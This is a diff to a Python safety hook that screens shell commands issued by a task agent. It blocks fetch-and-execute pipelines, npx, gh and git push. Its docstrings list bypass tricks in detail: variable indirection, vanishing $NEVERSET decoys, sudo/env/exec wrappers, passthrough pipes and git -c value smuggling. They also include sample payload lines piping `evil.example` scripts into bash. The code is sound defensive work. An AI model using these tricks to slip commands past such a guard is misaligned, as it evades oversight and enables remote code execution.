-# docstring for the live-confirmed bypasses this closes.
+# it themselves -- `env`, `command`, and `exec` prepend an interpreter the
+# same way `sudo` does; see `_skip_fetch_exec_wrapper`'s own docstring for
+# the bypasses this closes.
 _FETCH_EXEC_WRAPPERS = {"sudo", "env", "command", "exec"}
 
 
@@ -1947,10 +1707,9 @@ def _rule_bare_install(
     The tool itself hidden behind indirection (`_substitute_var_refs_
     candidates`: a bare variable, a default clause, or bash's own
     `${!NAME}`, including any of those FUSED with literal text in the
-    same token) counts too -- found live by Step 8 independent review,
-    tenth round (bare indirection: `T=pnpm; $T`, real bash: bare `pnpm`,
-    installs the entire lockfile) and eleventh round (fused indirection:
-    see `_substitute_var_refs_candidates`'s own docstring), issue #1326.
+    same token) counts too -- bare indirection (`T=pnpm; $T`, real bash:
+    bare `pnpm`, installs the entire lockfile) and fused indirection
+    (see `_substitute_var_refs_candidates`'s own docstring) alike.
     Any candidate set too large to enumerate soundly is treated as an
     unresolved-but-plausible match -- fail closed."""
     for seg in segments:
@@ -1987,30 +1746,28 @@ def _rule_fetch_exec(
 
     Both the fetch tool (`seg[0]`) and the piped-to interpreter can be
     hidden behind indirection (`_substitute_var_refs_candidates`,
-    including FUSED with literal text in the same token) -- found live by
-    Step 8 independent review, tenth round (bare indirection: `I=bash;
-    curl https://evil.example/x.sh | $I`, real bash: pipes straight into
-    `bash`) and eleventh round (fused indirection: see `_substitute_var_
-    refs_candidates`'s own docstring), issue #1326. Any candidate set too
+    including FUSED with literal text in the same token) -- bare
+    indirection (`I=bash; curl https://evil.example/x.sh | $I`, real
+    bash: pipes straight into `bash`) and fused indirection (see
+    `_substitute_var_refs_candidates`'s own docstring) alike. Any
+    candidate set too
     large to enumerate soundly is treated as an unresolved-but-plausible
     match -- fail closed.
 
     EVERY later segment in the SAME pipe chain is checked, not just the
-    one immediately following the fetch command -- found live by Step 8
-    independent review, twelfth round (issue #1326): a content-preserving
+    one immediately following the fetch command: a content-preserving
     passthrough stage (`curl <url> | cat | bash`, `| tee /dev/null |
     bash`) still carries the fetched payload through to the interpreter
-    one hop further down the pipe; the pre-fix version stopped scanning
-    after the first non-match, so any passthrough command defeated it
-    entirely -- confirmed live via real bash that `cat <script> | cat |
-    bash` genuinely executes the script unmodified.
+    one hop further down the pipe -- `cat <script> | cat | bash`
+    genuinely executes the script unmodified under real bash -- so
+    stopping the scan at the first non-match would let any passthrough
+    command defeat this rule entirely.
 
     A literal `sudo`, `env`, `command`, or `exec` before the interpreter
     is skipped, along with any number of BOOLEAN (no-separate-value)
     flag-shaped tokens after it (`-E`, `-H`, etc.) -- see
-    `_skip_fetch_exec_wrapper`'s own docstring for the live-confirmed
-    bypasses this closes, across the thirteenth (sudo flags) and
-    fourteenth (env/command/exec) Step 8 independent review rounds."""
+    `_skip_fetch_exec_wrapper`'s own docstring for the bypasses this
+    closes."""
     for chain in pipe_chains:
         for i, seg in enumerate(chain):
             if not seg:
@@ -2053,19 +1810,15 @@ def _skip_fetch_exec_wrapper(seg: list[str], name_to_raw_value: dict[str, str] |
     to nothing at real bash runtime (per `_token_is_all_unassigned_refs`,
     see its own docstring).
 
-    Factored out of `_rule_fetch_exec`'s own inline loop -- Step 8
-    independent review, fourteenth round (issue #1326) -- so
+    Factored out of `_rule_fetch_exec`'s own inline loop so
     `_rule_process_sub_fetch_exec` below can reuse the identical skip
     logic instead of growing its own copy.
 
-    The wrapper set was originally `sudo` alone (thirteenth round: a
-    literal `sudo` token, plus its own boolean flags, e.g. `curl <url> |
-    sudo -E bash`). Found live by Step 8 independent review, fourteenth
-    round (issue #1326): `env`/`command`/`exec` prepend an interpreter the
-    identical way `sudo` does, but were not recognized at all -- `curl
-    <url> | env bash`, `| command bash`, and `| exec bash` (each confirmed
-    live via real bash argv expansion to genuinely run `bash`) all bypassed
-    this rule while the equivalent `sudo bash` form was already caught.
+    The wrapper set covers `sudo` (a literal `sudo` token, plus its own
+    boolean flags, e.g. `curl <url> | sudo -E bash`) and
+    `env`/`command`/`exec`, which prepend an interpreter the identical
+    way -- `curl <url> | env bash`, `| command bash`, and `| exec bash`
+    each genuinely run `bash` under real bash argv expansion.
     Only a SINGLE leading wrapper token is skipped (not a stacked run of
     several) and `command`'s own flags (`-v`, `-p`) are not distinguished
     from a generic boolean flag -- a disclosed, narrower-than-full-parsing
@@ -2074,11 +1827,10 @@ def _skip_fetch_exec_wrapper(seg: list[str], name_to_raw_value: dict[str, str] |
     elsewhere.
 
     Also skips any number of `NAME=value`-shaped ENVIRONMENT-ASSIGNMENT
-    tokens after the wrapper -- found live by Step 8 independent review,
-    fourteenth round (issue #1326): `env`'s own leading assignments
-    (`env VAR=1 bash`, confirmed live via real bash argv expansion to
-    genuinely run `bash`) are not flag-shaped, so the boolean-flag-skip
-    loop alone stopped at `VAR=1` and never reached `bash`. Uses the SAME
+    tokens after the wrapper: `env`'s own leading assignments
+    (`env VAR=1 bash`, which genuinely runs `bash` under real bash argv
+    expansion) are not flag-shaped, so a boolean-flag-skip
+    loop alone would stop at `VAR=1` and never reach `bash`. Uses the SAME
     `_ASSIGN_RE` shape-match `_strip_leading_assignments` uses for a
     segment's OWN leading assignments (see that function's own
     docstring) -- the identical bash grammar rule, just applying to
@@ -2086,14 +1838,14 @@ def _skip_fetch_exec_wrapper(seg: list[str], name_to_raw_value: dict[str, str] |
     start of the segment, which `_strip_leading_assignments` alone does
     not reach.
 
-    Found live by Step 8 independent review, twenty-first round (issue
-    #1326): `curl <url> | sudo $NEVERSET bash` (NEVERSET never assigned)
-    was wrongly ALLOWED -- the interpreter candidate this function
-    returns landed ON `$NEVERSET` itself (past the literal `sudo` wrapper,
-    correctly not a flag/assignment so the OLD skip loop stopped there),
-    and the caller's own `_substitute_var_refs_candidates` resolution of
-    that candidate returned `[]` ("cannot resolve"), which the caller
-    treated as "resolved, and not a match" rather than looking past the
+    The vanishing-token skip exists because `curl <url> | sudo $NEVERSET
+    bash` (NEVERSET never assigned) genuinely invokes `bash` once
+    `$NEVERSET` word-splits away -- without the skip, the interpreter
+    candidate this function returns lands ON `$NEVERSET` itself (past
+    the literal `sudo` wrapper, correctly not a flag/assignment), and
+    the caller's own `_substitute_var_refs_candidates` resolution of
+    that candidate returns `[]` ("cannot resolve"), which the caller
+    treats as "resolved, and not a match" rather than looking past the
     decoy to what real bash actually runs at that position -- the SAME
     class of gap `_position_anchored_rules_hit`'s own docstring describes
     for `_rule_gh_any`/`_rule_bare_install`'s OWN `seg[0]` position,
@@ -2101,32 +1853,26 @@ def _skip_fetch_exec_wrapper(seg: list[str], name_to_raw_value: dict[str, str] |
     itself resolves, past a literal wrapper -- `_position_anchored_
     rules_hit`'s own segment-leading collapsed-reading pass never reaches
     it, since `seg[0]` (`sudo`) is not itself a vanishing reference.
-    Closed here, at the source of the position resolution, rather than by
-    trying to enumerate every interior position a caller might need a
-    collapsed reading for. Confirmed live via a real bash proxy (stand-in
-    `bash` binary on PATH, capturing its own argv) that this genuinely
-    invokes `bash` once `$NEVERSET` word-splits away.
+    Handled here, at the source of the position resolution, rather than
+    by trying to enumerate every interior position a caller might need a
+    collapsed reading for.
 
-    All THREE call sites now pass NAME_TO_RAW_VALUE -- `_rule_fetch_exec`
-    and `_rule_process_sub_fetch_exec` from the twenty-first round above,
-    and `_rule_eval_or_dashc_fetch_exec` from a twenty-second-round fix of
-    the identical gap this function's own docstring left that third call
-    site exposed to: `$NEVERSET eval "$(curl <url>)"` was wrongly ALLOWED
-    by the same mechanism (an unresolvable-because-vanishing candidate at
-    this function's own returned position, the caller giving up rather
-    than looking past it) until that call site was updated too -- see
-    `_rule_eval_or_dashc_fetch_exec`'s own docstring for the live
-    verification. NAME_TO_RAW_VALUE stays optional (`None` default) not
+    All THREE call sites (`_rule_fetch_exec`, `_rule_process_sub_fetch_
+    exec`, and `_rule_eval_or_dashc_fetch_exec`) pass NAME_TO_RAW_VALUE
+    -- leaving any one of them without it reopens the identical gap at
+    that call site (an unresolvable-because-vanishing candidate at this
+    function's own returned position, the caller giving up rather than
+    looking past it; `$NEVERSET eval "$(curl <url>)"` would be wrongly
+    ALLOWED -- see `_rule_eval_or_dashc_fetch_exec`'s own docstring).
+    NAME_TO_RAW_VALUE stays optional (`None` default) not
     because a caller is exempt today, but so a FUTURE caller that
     genuinely has no name-to-value map in scope is not forced to
     fabricate one.
 
-    Renamed from NAME_TO_VALUE to NAME_TO_RAW_VALUE by Step 8 independent
-    review, thirtieth round (issue #1326), ported from the main hook's
-    own identical fix: this parameter feeds `_token_is_all_unassigned_
-    refs`'s own vanishing check, which as of that same round needs the
-    case-PRESERVING map, not the lowercased one -- see that function's
-    own docstring for the live case-fold bypass this closes."""
+    Named NAME_TO_RAW_VALUE, not NAME_TO_VALUE: this parameter feeds
+    `_token_is_all_unassigned_refs`'s own vanishing check, which needs
+    the case-PRESERVING map, not the lowercased one -- see that
+    function's own docstring for the case-fold bypass this closes."""
     interp_index = 1 if (not _is_dynamic(seg[0]) and seg[0].lower() in _FETCH_EXEC_WRAPPERS) else 0
     while interp_index < len(seg) and (
         (
@@ -2144,8 +1890,8 @@ def _rule_process_sub_fetch_exec(
 ) -> str | None:
     """An interpreter fed a fetched-content process substitution (`bash
     <(curl <url>)`) runs the fetched payload just as directly as a piped
-    download does -- confirmed live via a real bash proxy (`bash <(echo
-    'echo PWNED')` genuinely runs the substituted content). Distinct from
+    download does (`bash <(echo 'echo PWNED')` genuinely runs the
+    substituted content under real bash). Distinct from
     `_rule_fetch_exec` above: process substitution is a FILE-like argument
     in the interpreter's OWN segment, not a separate pipe-chain segment,
     so it needs `segment_tokens`, not `_pipe_chains`.
@@ -2163,12 +1909,12 @@ def _rule_process_sub_fetch_exec(
     check can still see the fetch tool as its own token -- see that
     function's own docstring.
 
-    Found live by Step 8 independent review, fourteenth round (issue
-    #1326): no existing rule recognized process substitution as a data
-    path at all -- `<` is not one of `_pipe_chains`'/`segment_tokens`'s
-    own control-operator tokens, so `<(` survived as an ordinary literal
-    token pair inside whatever segment it appeared in, and curl never
-    became a segment head anywhere `_rule_fetch_exec` would check it."""
+    Without this rule, no other rule recognizes process substitution as
+    a data path at all -- `<` is not one of
+    `_pipe_chains`'/`segment_tokens`'s own control-operator tokens, so
+    `<(` survives as an ordinary literal token pair inside whatever
+    segment it appears in, and curl never becomes a segment head
+    anywhere `_rule_fetch_exec` would check it."""
     for seg in segments:
         if not seg:
             continue
@@ -2204,15 +1950,13 @@ def _process_sub_feeds_fetch_tool(
     sub_fetch_exec` to keep that function's own cyclomatic complexity
     within this module's xenon gate.
 
-    Found live by Step 8 independent review, twenty-second round (issue
-    #1326): HEAD_INDEX used to be read directly, assuming the process
-    substitution's own fetch-tool candidate always sits immediately after
-    its `<(`/`>(` opener -- a leading decoy interposed there (`bash
-    <($NEVERSET curl <url>)`, NEVERSET never assigned) made this function
-    read the decoy itself as "the head," missing the real, genuinely-
-    fetching `curl` one position further. Closed the same way as this
-    module's other twenty-second-round fixes: skip (don't stop at) a
-    vanishing token when looking for the head position."""
+    HEAD_INDEX is not read directly off the opener: assuming the process
+    substitution's own fetch-tool candidate always sits immediately
+    after its `<(`/`>(` opener lets a leading decoy interposed there
+    (`bash <($NEVERSET curl <url>)`, NEVERSET never assigned) read as
+    "the head," missing the real, genuinely-fetching `curl` one position
+    further -- so a vanishing token is skipped (not stopped at) when
+    looking for the head position."""
     for j, tok in enumerate(rest):
         if tok in ("<(", ">("):
             head_index = j + 1
@@ -2248,19 +1992,17 @@ def _fetch_tool_head(tokens: list[str]) -> bool:
     below to check a substitution's own inner head without duplicating
     `_rule_fetch_exec`'s own curl/wget-detection logic.
 
-    Found live by Step 8 independent review, twenty-second round (issue
-    #1326): `head` used to be read as `segs[0][0]` directly -- a leading
-    decoy there (`eval $($NEVERSET curl <url>)`, NEVERSET never assigned
+    `head` is not read as `segs[0][0]` directly: a leading decoy there
+    (`eval $($NEVERSET curl <url>)`, NEVERSET never assigned
     anywhere, including inside the substitution's own self-contained
-    text) made this function read the decoy itself as "the head," even
+    text) would read as "the head," even
     though the substitution's own real first surviving element (`curl`)
-    is exactly what a `seg[0]`-anchored check would need to see once bash
-    actually runs it. Closed the same way `_rule_array_literal_content`'s
+    is exactly what a `seg[0]`-anchored check needs to see once bash
+    actually runs it. Handled the same way `_rule_array_literal_content`'s
     own leading-decoy collapse works: strip the segment's own leading run
     of vanishing references (per `_strip_leading_unassigned_bare_refs`,
-    against this function's OWN self-contained NAME_TO_RAW_VALUE, per
-    that function's own thirtieth-round case-preserving fix) before
-    reading its first element."""
+    against this function's OWN self-contained, case-preserving
+    NAME_TO_RAW_VALUE) before reading its first element."""
     segs = segment_tokens(tokens)
     if not segs or not segs[0]:
         return False
@@ -2291,17 +2033,16 @@ def _command_spans(tokens: list[str]) -> list[list[str]]:
     needed, unlike going through `_fold_command_substitution_spans`'s own
     opaque, space-joined token text.
 
-    Used ONLY by `_rule_eval_or_dashc_fetch_exec` below -- found live by
-    Step 8 independent review, fifteenth round (issue #1326): that rule
-    used to operate on already-FOLDED segments and re-`tokenize` a folded
-    token's own reconstructed text to recover a `$(...)` argument's inner
-    tokens -- `eval $(echo "it's fine")` (confirmed live: harmless) was
+    Used ONLY by `_rule_eval_or_dashc_fetch_exec` below. Operating on
+    already-FOLDED segments and re-`tokenize`-ing a folded token's own
+    reconstructed text to recover a `$(...)` argument's inner tokens
+    does not work: `eval $(echo "it's fine")` (harmless) would be
     wrongly denied, with a misleading reason, because the fold's own
     space-joined reconstruction discards the original quoting: the
     apostrophe in "it's fine", no longer inside its own quotes once
     dequoted-then-rejoined, reads to a fresh `tokenize()` call as an
     unterminated quote, raising `TokenizeError` -- which the rule's own
-    fail-closed handling then treated as a fetch-exec match. This
+    fail-closed handling then treats as a fetch-exec match. This
     function sidesteps the whole reconstruction step: it operates on the
     RAW, UN-folded token stream, so the caller slices a span's inner
     tokens directly out of the original list, never re-parsing text at
@@ -2358,11 +2099,9 @@ def _rest_has_fetch_tool_substitution(rest: list[str]) -> bool:
             start, end = fused
             inner_text = rest[j][start + 2 : end - 1]
             # Deliberately plain `.strip()`, NOT `.strip(_BASH_DEFAULT_IFS)`
-            # -- considered during Step 8 independent review, twenty-
-            # seventh round (issue #1326), and left as-is: see the main
-            # hook's own identical decision (near its own equivalent
-            # command-substitution-content check), ported here for
-            # consistency.
+            # -- matches the main hook's own identical decision (near its
+            # own equivalent command-substitution-content check), ported
+            # here for consistency.
             if inner_text.strip():
                 try:
                     inner_tokens = tokenize(inner_text)
@@ -2382,9 +2121,9 @@ def _rule_eval_or_dashc_fetch_exec(tokens: list[str], name_to_raw_value: dict[st
     """`eval $(curl <url>)` and `bash -c "$(curl <url>)"` fetch a payload
     and feed its OUTPUT directly to `eval`/an interpreter's `-c` flag as
     the command text to run -- just as direct an exec of fetched content
-    as a literal pipe, confirmed live via a real bash proxy (`eval $(echo
-    "echo PWNED")` and `bash -c "$(echo 'echo PWNED')"` both genuinely run
-    the substituted text). Distinct from `_rule_fetch_exec`/`_rule_
+    as a literal pipe (`eval $(echo "echo PWNED")` and `bash -c "$(echo
+    'echo PWNED')"` both genuinely run the substituted text under real
+    bash). Distinct from `_rule_fetch_exec`/`_rule_
     process_sub_fetch_exec` above: the fetch tool here is not a pipe-chain
     segment head or a process-substitution's own head, but the FIRST
     command inside a `$(...)` substitution given as an ARGUMENT to eval or
@@ -2408,8 +2147,7 @@ def _rule_eval_or_dashc_fetch_exec(tokens: list[str], name_to_raw_value: dict[st
     resolved via indirection using that substitution's own self-contained
     assignments, via `_fetch_tool_head`).
 
-    Found live by Step 8 independent review, fourteenth round (issue
-    #1326): no existing rule recognized this pattern at all -- `_rule_
+    No other rule recognizes this pattern -- `_rule_
     command_substitution_content` recursively classifies a substitution's
     OWN inner content (catching `$(curl <url> | bash)`, where the danger
     is INSIDE the substitution), but `eval $(curl <url>)` and `bash -c
@@ -2417,24 +2155,20 @@ def _rule_eval_or_dashc_fetch_exec(tokens: list[str], name_to_raw_value: dict[st
     fetches, it does not execute) -- the danger is entirely in how the
     OUTER command uses the substitution's output.
 
-    Found live by Step 8 independent review, twenty-second round (issue
-    #1326): round twenty-first's own `_skip_fetch_exec_wrapper` fix
-    (skip a token that vanishes to nothing at real bash runtime, per
-    `_token_is_all_unassigned_refs`, when NAME_TO_VALUE is given) was
-    threaded into `_rule_fetch_exec`/`_rule_process_sub_fetch_exec`'s own
-    call sites but NOT into this one -- `$NEVERSET eval "$(curl <url>)"`
-    and `$NEVERSET bash -c "$(curl <url>)"` were both wrongly ALLOWED,
-    since the interpreter candidate this rule resolved landed ON the
-    decoy itself (`_is_dynamic(cand)` true, so the rule gave up entirely
+    This call site passes NAME_TO_RAW_VALUE to `_skip_fetch_exec_
+    wrapper` (the vanishing-token skip, per `_token_is_all_unassigned_
+    refs`) for the same reason `_rule_fetch_exec`/`_rule_process_sub_
+    fetch_exec` do: without it, `$NEVERSET eval "$(curl <url>)"`
+    and `$NEVERSET bash -c "$(curl <url>)"` are both wrongly ALLOWED,
+    since the interpreter candidate this rule resolves lands ON the
+    decoy itself (`_is_dynamic(cand)` true, so the rule gives up entirely
     rather than looking past it to the LITERAL `eval`/`bash` sitting
-    right after). Distinct from the residual disclosed two paragraphs
-    above: a VANISHING reference (never assigned anywhere) is a SOUND
-    thing to skip past, unlike an ASSIGNED variable this rule still
-    deliberately does not try to resolve. Confirmed live via a real bash
-    proxy (stand-in `eval`/`bash` behavior via real bash itself, since
-    both are shell builtins/the shell itself, not external binaries) that
-    both genuinely execute the fetched payload once the decoy word-splits
-    away."""
+    right after) -- yet both genuinely execute the fetched payload once
+    the decoy word-splits away (`eval`/`bash` being shell builtins/the
+    shell itself, not external binaries). Distinct from the residual
+    disclosed two paragraphs above: a VANISHING reference (never
+    assigned anywhere) is a SOUND thing to skip past, unlike an ASSIGNED
+    variable this rule still deliberately does not try to resolve."""
     for seg in _command_spans(tokens):
         if not seg:
             continue
@@ -2463,11 +2197,10 @@ def _rule_npx(
     """`npx` hidden behind indirection (`_resolve_seg_tokens_candidates`
     -> `_substitute_var_refs_candidates`, including FUSED with literal
     text in the same token) counts too, not just a plain literal token --
-    found live by Step 8 independent review, tenth round (bare
-    indirection: `N=npx; $N left-pad`, real bash: `npx left-pad`) and
-    eleventh round (fused indirection: `NSUF=NVAL; NVAL=px; n${!NSUF}
-    left-pad`, real bash: `npx left-pad`; see `_substitute_var_refs_
-    candidates`'s own docstring), issue #1326. Any candidate set too
+    bare indirection (`N=npx; $N left-pad`, real bash: `npx left-pad`)
+    and fused indirection (`NSUF=NVAL; NVAL=px; n${!NSUF} left-pad`,
+    real bash: `npx left-pad`; see `_substitute_var_refs_candidates`'s
+    own docstring) alike. Any candidate set too
     large to enumerate soundly is treated as an unresolved-but-plausible
     match -- fail closed."""
     for seg in segments:
@@ -2487,8 +2220,7 @@ def _rule_gh_any(
     above: `_WATCHED_TOOLS` in this file never includes "gh" at all (it
     is denied entirely, any subcommand, via this dedicated blanket rule
     instead of the adjacent-verb table those B-rules serve), so neither
-    generic rule ever considers `gh` a watched tool. Found live by Step 8
-    independent review, fourth round (issue #1326). Only `seg[0]` (the
+    generic rule ever considers `gh` a watched tool. Only `seg[0]` (the
     command word) is checked -- `gh` referenced anywhere else in the
     segment is not this rule's concern -- and no verb pairing is needed,
     since every `gh` subcommand is denied regardless of which one it is.
@@ -2496,15 +2228,13 @@ def _rule_gh_any(
     `seg[0]` resolved via `_substitute_var_refs_candidates` (bare
     reference, default clause, or bash's own `${!NAME}` indirect
     reference, including any of those FUSED with literal text in the
-    same token) counts as a "value" here too -- found live by Step 8
-    independent review, ninth round (default-clause: see `_substitute_
-    var_refs_candidates`'s own docstring for the general mechanism), tenth
-    round (`GREF=G; G=gh; ${!GREF} pr merge 1` resolves, real bash, to a
-    genuine `gh pr merge 1`), and eleventh round (fused indirection:
-    `HSUF=HVAL; HVAL=h; g${!HSUF} pr merge 1` resolves, real bash, to the
-    same genuine `gh pr merge 1` -- the whole-token-anchored resolvers
-    this rule used through the tenth round could never see a construct
-    fused with literal text in the same token), issue #1326. Any
+    same token) counts as a "value" here too -- a default clause (see
+    `_substitute_var_refs_candidates`'s own docstring for the general
+    mechanism), an indirect reference (`GREF=G; G=gh; ${!GREF} pr merge
+    1` resolves, real bash, to a genuine `gh pr merge 1`), and fused
+    indirection (`HSUF=HVAL; HVAL=h; g${!HSUF} pr merge 1` resolves,
+    real bash, to the same genuine `gh pr merge 1`, which no
+    whole-token-anchored resolver can see) alike. Any
     candidate set too large to enumerate soundly is treated as an
     unresolved-but-plausible match -- fail closed."""
     for seg in segments:
@@ -2525,8 +2255,8 @@ def _rule_gh_any(
 # following token (not just fused with "="): the two short options -c/-C
 # (both collapse to lowered "-c") plus every long option from git's own
 # usage synopsis that takes a value. `--exec-path`/`--html-path`/
-# `--man-path`/`--info-path` are deliberately excluded: confirmed against
-# git's own usage synopsis, `--exec-path` takes an OPTIONAL value only in
+# `--man-path`/`--info-path` are deliberately excluded: per git's own
+# usage synopsis, `--exec-path` takes an OPTIONAL value only in
 # the fused `--exec-path=<path>` form, and the other three take no value
 # at all -- none of the three ever separates a `push` token from `git`
 # the way a genuine separate-token value would.
@@ -2534,75 +2264,62 @@ _GIT_LONG_VALUE_FLAGS = {"--git-dir", "--work-tree", "--namespace", "--super-pre
 
 
 def _is_git_push_segment(seg: list[str], name_to_raw_value: dict[str, str]) -> bool:
-    """Found live by Step 8 independent review, twenty-second round (issue
-    #1326): the flag-skip loop below used to `break` the instant it met
-    ANY dynamic-shaped token, abandoning the scan rather than looking
-    past a token that vanishes to nothing at real bash runtime (per
-    `_token_is_all_unassigned_refs`) -- `git -v $NEVERSET push origin
-    main` (NEVERSET never assigned) was wrongly NOT recognized as a git
-    push, since the loop broke at the decoy sitting after the literal
-    `-v` flag, one position past where the fallback `seg[1]` checks at
-    this rule's own call site (`_rule_git_push`/the obfuscated-git-push
-    check in `_classify_tokens`) look. Confirmed live via a real bash
-    proxy (stand-in `git` binary on PATH, capturing its own argv) that
-    this genuinely runs `git push origin main` once the decoy word-splits
-    away. Closed by skipping (not breaking on) a vanishing token here
-    too, the same primitive `_skip_fetch_exec_wrapper`'s own twenty-
-    first-round fix already uses for an analogous position.
+    """The flag-skip loop below skips (rather than breaking on) a token
+    that vanishes to nothing at real bash runtime (per
+    `_token_is_all_unassigned_refs`): breaking the instant it meets ANY
+    dynamic-shaped token would abandon the scan at a decoy -- `git -v
+    $NEVERSET push origin main` (NEVERSET never assigned) genuinely runs
+    `git push origin main` once the decoy word-splits away, yet would
+    not be recognized as a git push, since the loop would break at the
+    decoy sitting after the literal `-v` flag, one position past where
+    the fallback `seg[1]` checks at this rule's own call site
+    (`_rule_git_push`/the obfuscated-git-push check in
+    `_classify_tokens`) look. The same skip primitive
+    `_skip_fetch_exec_wrapper` uses for an analogous position.
 
-    Found live by Step 8 independent review, twenty-third round (issue
-    #1326), ported from the main hook's own identical fix: the fix above
-    closed the OUTER flag-skip loop's own decoy gap, but the `-c`/
-    `_GIT_LONG_VALUE_FLAGS` value-consumption block a few lines below it
-    had the identical gap in miniature -- it read the token immediately
-    after the flag directly to decide whether to consume it as the
-    flag's own value, with no decoy-skip of its own. A decoy interposed
-    there (`git -c $NEVERSET user.name=x push origin main`, NEVERSET
-    never assigned) made this block see the decoy (dynamic) and decline
-    to consume it -- but the OUTER loop's own general decoy-skip then
-    consumed the decoy on its next iteration, landing on `user.name=x`
-    as an ordinary, never-claimed token that does not start with `-`,
-    so the outer loop `break`s there instead of recognizing it as
-    `-c`'s own already-intended value and continuing to `push` one
-    position further -- a HARD DENY bypass for this task-agent rule,
-    confirmed live via a real `git` binary (2.43.0) that `-c
-    user.name=x push origin main` genuinely reaches push dispatch
-    (`error: src refspec main does not match any` -- the real
-    ref-lookup failure of an empty scratch repo, not a config-parse
-    error) -- unlike the placeholder value `name=value` used during
-    this fix's own development, which real git rejects before ever
-    reaching a subcommand at all, a distinction found live by Step 8
-    independent review, twenty-fourth round (issue #1326) and corrected
-    here and in this fix's own tests.
+    The `-c`/`_GIT_LONG_VALUE_FLAGS` value-consumption block a few lines
+    below carries the identical decoy-skip in miniature -- reading the
+    token immediately after the flag directly, with no decoy-skip of
+    its own, fails: a decoy interposed there (`git -c $NEVERSET
+    user.name=x push origin main`, NEVERSET never assigned) makes the
+    block see the decoy (dynamic) and decline to consume it -- but the
+    OUTER loop's own general decoy-skip then consumes the decoy on its
+    next iteration, landing on `user.name=x` as an ordinary,
+    never-claimed token that does not start with `-`, so the outer loop
+    `break`s there instead of recognizing it as `-c`'s own
+    already-intended value and continuing to `push` one position
+    further -- a hard-deny bypass for this task-agent rule. With a real
+    `git` binary (2.43.0), `-c user.name=x push origin main` genuinely
+    reaches push dispatch (`error: src refspec main does not match any`
+    -- the real ref-lookup failure of an empty scratch repo, not a
+    config-parse error) -- unlike a placeholder value such as
+    `name=value`, which real git rejects before ever reaching a
+    subcommand at all.
 
-    A second, distinct gap in the SAME block, found in the same twenty-
-    third-round pass and ported from the main hook's own identical fix:
-    the original condition only ever consumed a LITERAL value -- an
-    ASSIGNED, non-vanishing DYNAMIC value in this exact position
-    (`CFG=user.name=x; git -c $CFG push origin main`) was never consumed
-    either, predating this round entirely. Confirmed live via a real
-    bash proxy that `-c` genuinely consumes `$CFG`'s own resolved value
-    as real argv, leaving `push` as the real subcommand -- a HARD DENY
-    bypass, missed since a dynamic token's own `literals[value_j]` is
-    always `None`, so the old value-consumption check could never fire
-    for it. A present (non-vanishing), DYNAMIC token is now also
-    consumed here, failing closed (assume it survives to occupy this
+    The same block also consumes a present (non-vanishing), DYNAMIC
+    value, not only a LITERAL one -- matching the main hook: with
+    `CFG=user.name=x; git -c $CFG push origin main`, `-c` genuinely
+    consumes `$CFG`'s own resolved value as real argv under bash,
+    leaving `push` as the real subcommand -- a dynamic token's own
+    `literals[value_j]` is always `None`, so a literal-only
+    value-consumption check can never fire for it, a hard-deny bypass.
+    Consuming it fails closed (assume it survives to occupy this
     position, so a real `push` sitting past it is not missed). This does
     not disturb the established, deliberately fail-closed `git -C -v
     push`-shaped precedent (`test_is_git_push_segment_value_flag_
     followed_by_another_flag`): a LITERAL, flag-shaped token is still
     declined here and re-examined as its own flag on the next
-    outer-loop iteration -- unchanged, matching the main hook's own
+    outer-loop iteration -- matching the main hook's own
     identical reasoning (real git's own fatal-error path on a malformed
     config key/path in that specific literal shape means no push
     actually reaches this scenario either way).
 
     Takes NAME_TO_RAW_VALUE (case-preserving), not the lowercased
-    NAME_TO_VALUE -- ported from `_token_is_all_unassigned_refs`'s own
-    thirtieth-round fix (see its own docstring): this function's caller
-    already has the case-preserving map in scope, and passing the
-    lowercased one here would silently reintroduce that same round's own
-    case-fold bug at this call site too."""
+    NAME_TO_VALUE -- matching `_token_is_all_unassigned_refs`'s own
+    case-preserving lookups (see its own docstring): this function's
+    caller already has the case-preserving map in scope, and passing the
+    lowercased one here would silently reintroduce the same case-fold
+    bug at this call site too."""
     literals = [(t.lower() if not _is_dynamic(t) else None) for t in seg]
     for i, tok in enumerate(literals):
         if tok != "git":
@@ -2628,15 +2345,12 @@ def _is_git_push_segment(seg: list[str], name_to_raw_value: dict[str, str]) -> b
             # token, not only fused with "=" (`--git-dir=<path>`). Skip
             # that value token too, or `git --git-dir /tmp/repo push`
             # would stop scanning at the non-flag-shaped path argument
-            # and miss the `push` after it -- the long-option
-            # separate-token form was found live by Step 8 independent
-            # review, fourth round (issue #1326): only the fused `=` form
-            # was ever tested, so `git --git-dir /tmp/repo push origin
-            # master` -- confirmed to actually push with real git --
-            # went undetected by this task-agent hard-deny rule. Every
-            # OTHER 2-char short global option (-v, -h, -p, -P) is
-            # boolean and takes no argument, confirmed against git's own
-            # usage synopsis -- found live by Step 8, second round.
+            # and miss the `push` after it -- `git --git-dir /tmp/repo
+            # push origin master` actually pushes with real git, so the
+            # separate-token form matters, not only the fused `=` form.
+            # Every OTHER 2-char short global option (-v, -h, -p, -P) is
+            # boolean and takes no argument, per git's own usage
+            # synopsis.
             if flag == "-c" or flag in _GIT_LONG_VALUE_FLAGS:
                 value_j = j
                 while value_j < len(literals):
@@ -2665,8 +2379,7 @@ def _resolve_seg_tokens_candidates(
     caller of `_substitute_var_refs_candidates` already takes
     individually. Factored out here since `_rule_git_push` and B1a/B1b
     below (and the sibling module's own equivalents) had each grown a
-    byte-identical copy of this loop. Found by Step 8 independent review,
-    twelfth round (issue #1326). Ported from
+    byte-identical copy of this loop. Ported from
     hooks/gitapex_check_bash_safety.py's own function of the same name."""
     values: set[str] = set()
     for tok in tokens:
@@ -2691,10 +2404,9 @@ def _rule_git_push(
             # A dynamic command word with a literal "push" token already
             # present elsewhere in the SAME segment (`$G push origin
             # main`) needs no indirection lookup at all -- "push" is
-            # right there. Found live by Step 8 independent review, third
-            # round (issue #1326): the indirection-only check below never
+            # right there. The indirection-only check below never
             # fires here, since "push" is a plain literal argument, not
-            # referenced by any dynamic token, so it never entered
+            # referenced by any dynamic token, so it never enters
             # `values`. Mirrors what the sibling
             # hooks/gitapex_check_bash_safety.py module already does for
             # git-push detection via its own
@@ -2704,23 +2416,20 @@ def _rule_git_push(
             # Scoped to what THIS segment's own dynamic tokens actually
             # resolve to -- not "some assignment anywhere in the whole
             # command happens to be named git/push," regardless of
-            # whether this segment references it at all (found live by
-            # Step 8 independent review, issue #1326: the earlier
-            # flat-set version denied
+            # whether this segment references it at all (a flat-set
+            # version would wrongly deny
             # `GIT=x; PUSH=y; echo done; Z=$(mktemp); "$Z" --help`).
             #
             # Every dynamic token is resolved via
             # `_substitute_var_refs_candidates` (bare reference, default
             # clause, or bash's own `${!NAME}` indirect reference,
